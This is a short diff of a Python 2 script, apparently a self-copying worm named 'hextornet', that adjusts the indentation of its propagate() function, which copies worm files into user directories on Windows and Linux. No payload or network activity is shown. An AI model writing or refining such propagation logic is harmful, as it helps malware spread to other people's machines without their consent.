@@ -75,16 +75,16 @@ def propagate():
 				for hexworm in hextornet:
 					dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + str(hexworm) + '.py'
 					copyHex(hexworm, src, dst)
-					directories.remove(directory)
+				directories.remove(directory)
 
 			elif linux_client():
 				for hexworm in hextornet:
 					print'[DEBUG] WORM | DIRECTORY:',hexworm, directory
 					dst = '/' + usr + '/' + directory + '/' + str(hexworm) + '.py'
-					copyHex(hexworm, src, dst)
-				directories.remove(directory)
 			else:
 				dst = os.getcwd() + "hextornet.py"
+			copyHex(hexworm, src, dst)
+			directories.remove(directory)
 	print("=================================")
 
 #Use in windows
